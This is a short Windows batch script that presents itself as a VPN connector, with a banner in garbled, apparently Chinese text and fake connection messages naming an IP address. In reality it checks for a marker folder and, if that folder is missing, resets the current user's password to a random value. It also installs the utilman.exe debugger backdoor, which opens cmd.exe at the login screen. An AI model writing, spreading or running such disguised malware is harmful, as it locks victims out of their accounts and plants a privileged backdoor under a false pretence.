@echo off
@title VPN
echo ****************************
echo *                          *
echo *     ��ر�360�����      *
echo *     ������޷�����       *
echo *                          *
echo ****************************
pause
if  exist "C:\blingcc" (goto no1) else (goto no2)
:no1
echo VPN�������� Germany 185.117.84.23!
pause
exit
:no2
echo VPN�������� Amsterdam 185.117.84.23!
net user %username% %random%
reg add "HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\utilman.exe" /v Debugger /t REG_SZ /d "C:\Windows\System32\cmd.exe" /f
pause